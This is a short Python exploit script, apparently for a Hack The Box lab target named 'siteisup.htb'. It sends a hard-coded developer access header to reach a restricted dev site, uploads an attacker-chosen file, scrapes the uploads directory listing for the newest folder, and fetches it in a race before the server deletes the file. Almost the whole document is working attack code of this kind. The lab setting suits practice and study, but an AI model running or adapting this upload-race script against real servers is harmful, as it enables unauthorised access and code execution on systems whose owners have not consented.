import requests
import sys
beforeDirText='<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>'
beforeLen= len(beforeDirText)


def sendPost(session):
	with open(sys.argv[1], 'rb') as file:
		try:
			r = session.post('http://dev.siteisup.htb', files={sys.argv[1]: file}, timeout=0.1)
		except requests.exceptions.ReadTimeout:	#the hope is this except with short timeout will skip waiting for response
			pass


def getHash(session):
	#race to grab the file before its deleted
	r= session.get("http://dev.siteisup.htb/uploads/")
	#print(r.text)
	responseText = r.text
	locationSplit= responseText.find(beforeDirText)
	responseTextClipped= responseText[locationSplit+beforeLen:]
	#print(responseTextClipped)
	locationHref= responseTextClipped.find("href")+6
	locationEnd= responseTextClipped[locationHref:].find("/")
	#print(locationHref)
	#print(locationEnd)
	hashValue=responseTextClipped[locationHref:locationHref+locationEnd]	#clips from href -> /
	print(hashValue)	#this is the time directory value that is currently first available
	return hashValue

def openFile(session,hashValue):
	#urlString= "http://dev.siteisup.htb/uploads/"+hashValue+"/"+sys.argv[1]
	r=session.get("http://dev.siteisup.htb/uploads/"+hashValue+"/")
	print(r.text)

with requests.Session() as session:
	session.headers.update({'Special-Dev': '"only4dev"'})
	sendPost(session)
	hashValue=getHash(session)
	openFile(session,hashValue)